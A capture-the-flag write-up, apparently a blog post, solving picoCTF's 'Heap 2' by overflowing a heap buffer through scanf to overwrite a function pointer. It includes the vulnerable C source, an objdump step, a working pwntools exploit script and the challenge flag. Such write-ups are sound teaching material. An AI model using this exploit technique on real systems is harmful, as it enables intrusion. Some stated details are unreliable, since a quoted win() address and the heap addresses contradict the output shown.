---
layout: post
title:  "Heap 2"
description: Utilizing a buffer overflow payload to override pointers
date:   2024-10-22
tags: ["Medium", "Buffer Overflow", "Binary Exploitation"]
category: [CTF,picoCTF]
comments: true
contents: false
---

{: .prompt-info }
> **Provided By**  
> [Rivers](https://rivers.sh) <- visit their site!

## Challenge Info
Can you handle function pointers? Download the binary [here](https://artifacts.picoctf.net/c_mimas/49/chall). Download the source [here](https://artifacts.picoctf.net/c_mimas/49/chall.c).

Additional details will be available after launching your challenge instance.

## Understanding chall.c

The code for your convenience:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

- Defines a constant for the max size of the flag string (`FLAGSIZE_MAX`).
- Two char pointers are declared: `x` is used to store a string, `input_data` stores user input- each being 5 bytes of size.
- A `win()` function is declared. It reads the flag from a file (`flag.txt`) and prints it for us. It uses a buffer to store said flag, and ensures that it doesn't exceed `FLAGSIZE_MAX`
- A `check_win()` is declared. It executes a function at the address stored in the `x` pointer.
- The `init()` function allocates memory for `input_data` and `x`, and initializes them with the strings "pico" and "bico" respectively.
- The `write_buffer()` function asks the use for input, which the function will then store in `input_data` using `scanf` (recall that `scanf` is unsafe, as it does not check for buffer overflows).


## Vulnerabilities
There's several vulnerabilities to note:
- The `write_buffer()` function is using `scanf` to read user input. `scanf` is unsecure and can be overflowed.
- The `input_data` and `x` buffer are allocated to hold only 5 bytes (4 bytes and then a null character)
- The `check_win()` function executes code at the memory address being stored in `x`.


## Connecting to the netcat listener
```terminal
> nc mimas.picoctf.net 55662

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value
+-------------+-----------+
[*]   0x18572b0  ->   pico
+-------------+-----------+
[*]   0x18572d0  ->   bico

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice:
```
Again, `pico` and `bico` are the values inside the buffers (`input_data` & `x` respectively) that were declared at the start. Again, the reason they're declared to be 5 bytes, is to leave 1 byte for the null character.

Just like last time, we're given the addresses. The only thing that's different is that these are buffers instead of variables. Again, we'll subtract the address of `pico` with the address of `bico`.

`0x22b82b0 - 0x22b82d0 = -0x20`. When ran through [cyber chef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Decimal('Space',false)&input=LTB4MjA) (from hex to decimal) we get a value of 32. And because like last time, our initial hex value was negative, this means that `input_data` is 32 bytes behind `x`.


## The Plan

We now know that `input_data` is 32 bytes behind `x`. Additionally, we know that the `check_win()` function executes a function at the address stored in the `x` pointer. Finally we know that if a `win()` function is declared, it'll read us the flag.

*So, in short, we want to:* overflow to reach the `x` pointer, and then get it to hold a value identical to the address of the `win()` function, so that when `check_win()` is automatically ran, instead of executing *'bico'* at `x`, it will execute `win()`- thus giving us our flag.

## Solution

Before we write our payload, we need to know the address corresponding to `win()`. A simple [objdump](https://man7.org/linux/man-pages/man1/objdump.1.html) will reveal this:

```terminal
> objdump -d ./chall | grep win
00000000004011a0 <win>:
00000000004011f0 <check_win>:
```

We now know that `win()` is at `0x080484b6`. **However**, because of C's memory layout, we need to consider C's memory layout. C uses a little-endian system to ensure that the least significant bytes are placed first. Because of this, we want to input the address of `win()` in little-endian order.

Our payload should look something like this:

```py
from pwn import *

# Connect to the remote service
p = remote("mimas.picoctf.net", 53827)

# Construct the payload
payload = b"AAAA" * 8 + b"\xa0\x11\x40\x00\x00\x00\x00\x00"

# Send option '2' to allocate the object
p.sendline(b"2")

# Wait for the server to ask for the buffer input
p.recvuntil(b"buffer:")

# Send the constructed payload
p.sendline(payload)

# Wait for the next prompt (choice menu)
p.recvuntil(b"choice:")

# Send option '4' to check for win condition
p.sendline(b"4")

# Print the final output (possibly the flag)
print(p.recvall())
```

flag: `picoCTF{and_down_the_road_we_go_dde41590}`
